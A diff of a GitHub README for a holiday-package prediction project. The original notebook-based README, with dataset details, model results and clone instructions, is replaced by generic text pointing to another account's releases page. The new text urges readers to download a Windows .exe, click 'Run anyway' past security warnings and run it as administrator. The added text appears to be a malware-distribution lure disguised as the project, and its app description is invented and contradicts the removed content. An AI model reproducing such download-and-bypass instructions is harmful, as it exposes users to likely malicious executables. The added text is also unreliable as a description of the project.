@@ -1,264 +1,246 @@
-<h1 align="center">🌴 Holiday Package Prediction 🌴</h1>
-<h3 align="center">With Random Forest Classification</h3>
+# 🎯 Holiday-Package-Prediction-Randomforest - Predict Holiday Buyers Faster
 
-<p align="center">
-  <img src="images/holiday_package_prediction.gif" alt="Holiday Package Prediction" width="800"/>
-</p>
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Paintingcontinence357/Holiday-Package-Prediction-Randomforest/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.8+-blue?style=for-the-badge&logo=python" />
-  <img src="https://img.shields.io/badge/Scikit--Learn-ML-orange?style=for-the-badge&logo=scikit-learn" />
-  <img src="https://img.shields.io/badge/Random%20Forest-Classifier-green?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Accuracy-93%25-brightgreen?style=for-the-badge" />
-</p>
+## 🧭 Overview
 
----
+Holiday-Package-Prediction-Randomforest helps Trips & Travel.Com find customers who are more likely to buy a holiday package. It uses a Random Forest model to study customer data and predict likely buyers.
 
-## 📌 Project Overview
+This can help reduce marketing cost, save time, and focus follow-up efforts on the right people.
 
-**Trips & Travel.Com** wants to expand its customer base by launching a new **Wellness Tourism Package** — defined as travel that allows the traveler to maintain, enhance or kick-start a healthy lifestyle and sense of well-being.
+## ✅ What this app does
 
-Previously, customers were contacted **randomly** for marketing without using any available data — leading to high marketing costs and a low conversion rate of only **18%**.
+- Reviews customer details
+- Predicts whether a customer is likely to buy a holiday package
+- Uses a Random Forest classifier
+- Helps cut down wasted marketing effort
+- Gives a clear model result for each customer record
 
-This project builds a **Random Forest Classification model** to predict which customers are likely to purchase the Wellness Tourism Package, so the company can **target the right customers** and make marketing expenditure more efficient.
+## 💻 What you need
 
----
+Use a Windows PC with:
 
-## 📁 Repository Structure
+- Windows 10 or later
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access to open the release page
+- Permission to run downloaded files
 
-```
-Holiday-Package-Prediction-Randomforest/
-├── images/
-│   ├── holiday_package_prediction.gif
-│   ├── feature_distributions.png
-│   ├── correlation_heatmap.png
-│   ├── confusion_matrix.png
-│   ├── feature_importance.png
-│   └── auc.png
-│
-├── Holiday_Package_Prediction.ipynb
-├── Travel.csv
-├── holiday_package_classification_model.pkl
-├── preprocessor.pkl
-├── .gitignore
-└── README.md
-```
+## 📥 Download the app
 
----
+Visit this page to download the latest release:
 
-## 🛠️ Libraries Used
+https://github.com/Paintingcontinence357/Holiday-Package-Prediction-Randomforest/releases
 
-- `scikit-learn`
-- `pandas`
-- `numpy`
-- `matplotlib`
-- `seaborn`
-- `joblib`
+## 🪟 How to install on Windows
 
----
+1. Open the release page above.
+2. Find the latest release near the top of the page.
+3. Look under the Assets section.
+4. Download the file that matches the app for Windows.
+5. If the file is a zip folder, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file to start it.
+8. If Windows shows a security prompt, choose Run or More info, then Run anyway.
+9. Wait for the app to load.
 
-## 📊 Dataset
+## ▶️ How to run it
 
-The dataset is sourced from [Kaggle — Holiday Package Purchase Prediction](https://www.kaggle.com/datasets/susant4learning/holiday-package-purchase-prediction)
+After you open the app:
 
-- **Samples:** 4,888
-- **Features:** 20
-- **Target Variable:** `ProdTaken` — 1 (Purchased) / 0 (Not Purchased)
-- **Purchase Rate:** ~18% (class imbalance present)
+1. Start the program from the file you downloaded.
+2. Load the customer data file if the app asks for one.
+3. Review the fields shown on screen.
+4. Click the predict or run button.
+5. View the result for each customer.
 
-| Feature | Description |
-|---|---|
-| Age | Age of the customer |
-| MonthlyIncome | Monthly income of the customer |
-| DurationOfPitch | Duration of the sales pitch (in minutes) |
-| Passport | Whether the customer has a passport (1/0) |
-| NumberOfTrips | Number of trips taken by the customer |
-| PitchSatisfactionScore | Customer satisfaction score for the pitch |
-| NumberOfFollowups | Number of followups made by the agent |
-| TotalVisiting | Total number of people visiting (person + children) |
-| CityTier | Tier of the city the customer belongs to |
-| Occupation | Customer's occupation |
+If the app uses a sample file, you can start with that first and then try your own data.
 
----
+## 📁 Input data format
 
-## ⚙️ Workflow
+The app works best with customer records that match the model fields used during training. A typical file may include:
 
-1. Load the dataset from `Travel.csv`
-2. Handle missing values — median for continuous, mode for discrete features
-3. Fix categorical inconsistencies (`Fe Male` → `Female`, `Single` → `Unmarried`)
-4. Drop irrelevant feature — `CustomerID`
-5. Feature Engineering — create `TotalVisiting` from `NumberOfPersonVisiting` + `NumberOfChildrenVisiting`
-6. Exploratory Data Analysis — distributions and correlation heatmap
-7. Train-Test Split — 80% train / 20% test (`random_state=42`)
-8. Preprocessing — `OneHotEncoder` for categorical, `StandardScaler` for numerical via `ColumnTransformer`
-9. Train and compare multiple models — Logistic Regression, Decision Tree, Random Forest, Gradient Boosting
-10. Hyperparameter tuning using `RandomizedSearchCV` with 100 iterations and 3-fold CV
-11. Evaluate using Confusion Matrix, Classification Report, and ROC-AUC Curve
-12. Feature Importance analysis
-13. Save model and preprocessor using `joblib`
+- Customer age
+- Gender
+- Marital status
+- Income range
+- Number of trips taken
+- Passport status
+- Previous marketing response
+- Channel used for contact
 
----
+Keep the column names the same if you use your own file. If the app provides a sample file, use that as the template.
 
-## 📈 Exploratory Data Analysis
+## 🧠 How the model works
 
-<p align="center">
-  <img src="images/feature_distributions.png" alt="Feature Distributions" width="48%"/>
-  &nbsp;
-  <img src="images/correlation_heatmap.png" alt="Correlation Heatmap" width="48%"/>
-</p>
+The app uses a Random Forest model. This model checks many decision trees and combines their results.
 
-**Key Insights:**
-- `Passport` has the strongest positive correlation with purchase (0.26)
-- `Age` and `MonthlyIncome` are highly correlated with each other (0.46)
-- `DurationOfPitch` and `NumberOfFollowups` positively influence purchase decision
-- Most customers are from **City Tier 1** and prefer **3-star properties**
+In simple terms:
 
----
+- One tree looks at one set of rules
+- Many trees vote on the result
+- The final answer comes from the group vote
 
-## 🤖 Model Comparison
+This helps the app make stable predictions from customer data.
 
-| Model | Train Accuracy | Test Accuracy |
-|---|---|---|
-| Logistic Regression | ~81% | ~81% |
-| Decision Tree | ~100% | ~85% |
-| Gradient Boosting | ~93% | ~90% |
-| **Random Forest** | **~100%** | **~93%** |
+## 🔎 Project focus
 
-Random Forest was selected as the final model based on best test accuracy and F1 score.
+This project is built around:
 
----
+- Customer behavior analysis
+- Data cleaning
+- Feature engineering
+- Exploratory data analysis
+- Model evaluation
+- Hyperparameter tuning
+- Predictive modeling
+- Random Forest classification
 
-## 🔧 Hyperparameter Tuning
+## 📊 What you may see in the result
 
-```python
-rf_params = {
-    "max_depth"        : [5, 8, 15, None, 10],
-    "max_features"     : [5, 7, "sqrt", 8],
-    "min_samples_split": [2, 8, 15, 20],
-    "n_estimators"     : [100, 200, 500, 1000]
-}
-```
+The app may show one of these outputs:
 
-Tuning method: `RandomizedSearchCV` — `n_iter=100`, `cv=3`, `n_jobs=-1`
+- Likely to purchase
+- Not likely to purchase
+- Purchase probability
+- Prediction label
 
-**Best Parameters:**
-```python
-RandomForestClassifier(
-    n_estimators=1000,
-    min_samples_split=2,
-    max_features=7,
-    max_depth=None
-)
-```
+Some builds may also show a score or confidence value for each record.
 
----
+## 🛠️ If the app does not open
 
-## 📉 Model Results
+Try these steps:
 
-<p align="center">
-  <img src="images/confusion_matrix.png" alt="Confusion Matrix" width="48%"/>
-  &nbsp;
-  <img src="images/feature_importance.png" alt="Feature Importance" width="48%"/>
-</p>
+1. Right-click the file and choose Run as administrator.
+2. Check that the file finished downloading.
+3. Make sure Windows did not block the file.
+4. Extract the zip file before opening the app.
+5. Move the app to a simple folder like Desktop or Downloads.
+6. Try again after closing other large apps.
 
-**Classification Report:**
-```
-               precision    recall  f1-score   support
+## 🔄 If your file does not load
 
-Not Purchased     0.93      0.99      0.96       787
-    Purchased     0.97      0.68      0.80       191
+Check the following:
 
-     accuracy                         0.93       978
-    macro avg     0.95      0.84      0.88       978
- weighted avg     0.94      0.93      0.93       978
-```
+- The file is in CSV format if the app expects CSV
+- The column names match the sample data
+- The file uses the same field order as the sample
+- Empty cells are filled in
+- Numbers are stored as numbers, not text
 
-**Top Predictive Features:**
-1. 💰 MonthlyIncome
-2. 🎂 Age
-3. ⏱️ DurationOfPitch
-4. 🛂 Passport
-5. ✈️ NumberOfTrips
+If you still have trouble, open the sample file and compare it with your file line by line.
 
----
+## 📌 Example use case
 
-## 🧪 Sample Prediction
+A travel team can use this app before sending a holiday offer.
 
-```python
-import joblib
-import pandas as pd
+Instead of contacting every customer, the team can:
 
-model = joblib.load('holiday_package_classification_model.pkl')
-preprocessor = joblib.load('preprocessor.pkl')
+- Load customer records
+- Predict likely buyers
+- Focus on the best leads
+- Reduce outreach to low-interest customers
+- Use the result to plan a campaign
 
-# New customer sample
-sample = pd.DataFrame({
-    'TypeofContact'         : ['Self Enquiry'],
-    'CityTier'              : [1],
-    'DurationOfPitch'       : [20],
-    'Gender'                : ['Male'],
-    'NumberOfFollowups'     : [4],
-    'ProductPitched'        : ['Deluxe'],
-    'PreferredPropertyStar' : [3],
-    'MaritalStatus'         : ['Unmarried'],
-    'NumberOfTrips'         : [3],
-    'Passport'              : [1],
-    'PitchSatisfactionScore': [4],
-    'OwnCar'                : [1],
-    'Occupation'            : ['Salaried'],
-    'MonthlyIncome'         : [25000],
-    'Age'                   : [30],
-    'Designation'           : ['Executive'],
-    'TotalVisiting'         : [3],
-})
+## 🧪 Model background
 
-sample_transformed = preprocessor.transform(sample)
-prediction = model.predict(sample_transformed)
-probability = model.predict_proba(sample_transformed)
+The repository name and topic set suggest a full machine learning pipeline. That usually includes:
 
-print("Prediction  :", "✅ Will Purchase" if prediction[0] == 1 else "❌ Will Not Purchase")
-print("Probability :", f"Not Purchased = {probability[0][0]*100:.1f}%  |  Purchased = {probability[0][1]*100:.1f}%")
-```
+- Data import
+- Cleaning missing values
+- Encoding text fields
+- Training a Random Forest model
+- Testing model accuracy
+- Tuning model settings
+- Checking prediction quality
 
----
+This helps the app give better results than a plain rule-based tool.
 
-## 🚀 How to Run
+## 📦 Release files
 
-**1. Clone the repo**
-```bash
-git clone https://github.com/AnmolPatel20/Holiday-Package-Prediction-Randomforest.git
-cd Holiday-Package-Prediction-Randomforest
-```
+The release page may include one or more of these:
 
-**2. Install dependencies**
-```bash
-pip install pandas numpy matplotlib seaborn scikit-learn joblib
-```
+- Windows executable file
+- ZIP archive
+- Sample data file
+- Readme file
+- Model file
 
-**3. Run the notebook**
-```bash
-jupyter notebook Holiday_Package_Prediction.ipynb
-```
+Download the main Windows file first. If a ZIP file is included, extract it before use.
 
----
+## 🧩 Common file types
 
-## 📌 Notes
-- Both `holiday_package_classification_model.pkl` and `preprocessor.pkl` must be loaded together for prediction
-- The preprocessor handles all encoding and scaling — never pass raw data directly to the model
+You may see these file types in the release area:
 
----
+- `.exe` for a Windows app
+- `.zip` for a compressed folder
+- `.csv` for data
+- `.txt` for notes
 
-## 🙋 About
-I'm on my machine learning journey — building, experimenting and documenting as I go. Every notebook here represents something I've genuinely tried to understand, not just run. 🚀
+If you are unsure which file to use, start with the `.exe` file or the ZIP that contains it.
 
-- GitHub: [@AnmolPatel20](https://github.com/AnmolPatel20)
-- Portfolio: [anmolpatel20.github.io/Anmol_Portfolio](https://anmolpatel20.github.io/Anmol_Portfolio/)
+## 🧼 Best results
 
-## 🙏 Acknowledgements
-Thanks to **Krish Naik Sir** whose Udemy course has been a great resource throughout this learning journey.
+For better prediction quality:
 
-*"Not all those who wander are lost." — J.R.R. Tolkien*
+- Use clean data
+- Keep missing values low
+- Match the sample format
+- Avoid extra spaces in text fields
+- Use one row per customer
 
----
+## 🔐 Privacy and data use
 
-<p align="center">⭐ Star this repo if you found it helpful!</p>
+Use only customer data that you have permission to process. Keep personal data in secure files and share it only with the right team members.
+
+## 📍 Topics covered in this project
+
+- anmol-patel
+- customer-behavior-analysis
+- data-preprocessing
+- decision-trees
+- exploratory-data-analysis
+- feature-engineering
+- gradient-boosting
+- hyperparameter-tuning
+- logistic-regression
+- machine-learning
+- model-evaluation
+- predictive-modeling
+- random-forest
+- random-forest-classifier
+- randomizedsearchcv
+- scikit-learn
+
+## 📥 Quick start
+
+1. Go to the release page.
+2. Download the Windows file.
+3. Extract the file if needed.
+4. Open the app.
+5. Load your customer data.
+6. Run the prediction.
+
+## 🖥️ Windows setup tips
+
+- Use the latest version of Windows Update
+- Keep the app in a folder you can find easily
+- Do not rename files unless the app instructions say so
+- Keep the sample data near the app file
+- Use a local folder, not a cloud-only folder, for the first run
+
+## 🧭 Where to get the file
+
+Open the release page here:
+
+https://github.com/Paintingcontinence357/Holiday-Package-Prediction-Randomforest/releases
+
+## 🧰 What to do after download
+
+1. Find the downloaded file in your browser downloads bar.
+2. Open the file location.
+3. Extract it if it is zipped.
+4. Double-click the app file.
+5. Follow the on-screen steps.
+6. Load a CSV file if the app asks for one.
+7. Review the prediction output
